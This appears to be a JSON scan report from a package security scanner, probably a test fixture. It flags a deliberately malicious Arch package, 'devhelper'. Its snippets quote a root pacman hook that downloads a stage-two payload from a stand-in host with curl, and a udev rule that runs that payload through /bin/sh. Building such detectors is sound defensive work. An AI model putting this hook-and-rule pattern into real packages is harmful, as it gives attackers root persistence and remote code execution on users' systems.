@@ -1,0 +1,96 @@
+{
+  "package_name": "devhelper",
+  "package_version": "1.0.0-1",
+  "findings": [
+    {
+      "id": "INSTALL-003",
+      "severity": "critical",
+      "category": "network_security",
+      "title": "Network access in install script (alpm hook)",
+      "description": "Install scripts should not make network connections",
+      "location": {
+        "file": "tests/fixtures/malicious/shipped-root-hooks/zz-sync.hook",
+        "line": 8,
+        "column": 17,
+        "snippet": "Exec = /usr/bin/curl -fsSL https://evil.example/stage2 -o /tmp/stage2"
+      },
+      "recommendation": "Install scripts should never download additional content",
+      "cwe_id": "CWE-494",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "curl",
+        "script_kind": "alpm hook"
+      }
+    },
+    {
+      "id": "CHK-005",
+      "severity": "high",
+      "category": "cryptography",
+      "title": "All non-VCS sources use SKIP checksum",
+      "description": "No integrity verification is performed on 2 non-VCS source(s): zz-sync.hook, 99-devhelper.rules",
+      "location": {
+        "file": "tests/fixtures/malicious/shipped-root-hooks/PKGBUILD",
+        "line": null,
+        "column": null,
+        "snippet": "source: zz-sync.hook, 99-devhelper.rules"
+      },
+      "recommendation": "Provide real checksums for non-VCS sources",
+      "cwe_id": "CWE-354",
+      "metadata": {
+        "non_vcs_source_count": 2,
+        "unverified_indices": [
+          0,
+          1
+        ],
+        "unverified_sources": [
+          "zz-sync.hook",
+          "99-devhelper.rules"
+        ],
+        "vcs_source_count": 0
+      }
+    },
+    {
+      "id": "PERSIST-012",
+      "severity": "high",
+      "category": "persistence",
+      "title": "pacman hook runs a fetch, a shell command or a user/temp path",
+      "description": "zz-sync.hook is a libalpm hook (runs as root) whose Exec downloads, or runs something from /tmp, /dev/shm or a home directory. A hook like this is a root persistence mechanism.",
+      "location": {
+        "file": "tests/fixtures/malicious/shipped-root-hooks/zz-sync.hook",
+        "line": 8,
+        "column": null,
+        "snippet": "Exec = /usr/bin/curl -fsSL https://evil.example/stage2 -o /tmp/stage2"
+      },
+      "recommendation": "Do not install. A hook should run a fixed, packaged program with a narrow Target.",
+      "cwe_id": "CWE-506",
+      "metadata": {
+        "matched_text": "Exec = /usr/bin/curl -fsSL https://evil.example/stage2 -o /tmp/stage2"
+      }
+    },
+    {
+      "id": "PERSIST-014",
+      "severity": "high",
+      "category": "persistence",
+      "title": "udev rule runs a shell command, a fetch or a user/temp path",
+      "description": "99-devhelper.rules is a udev rule (runs as root when a device appears) that runs `/bin/sh -c '/tmp/stage2'`, which executes a shell command string.",
+      "location": {
+        "file": "tests/fixtures/malicious/shipped-root-hooks/99-devhelper.rules",
+        "line": 1,
+        "column": null,
+        "snippet": "/bin/sh -c '/tmp/stage2'"
+      },
+      "recommendation": "Do not install. A udev rule should call a fixed, packaged program.",
+      "cwe_id": "CWE-506",
+      "metadata": {
+        "matched_text": "/bin/sh -c '/tmp/stage2'"
+      }
+    }
+  ],
+  "scanned_files": [
+    "tests/fixtures/malicious/shipped-root-hooks/PKGBUILD",
+    "tests/fixtures/malicious/shipped-root-hooks/zz-sync.hook",
+    "tests/fixtures/malicious/shipped-root-hooks/99-devhelper.rules"
+  ],
+  "timestamp": "2026-11-10T14:51:09.053521588Z",
+  "scan_duration_ms": 26
+}
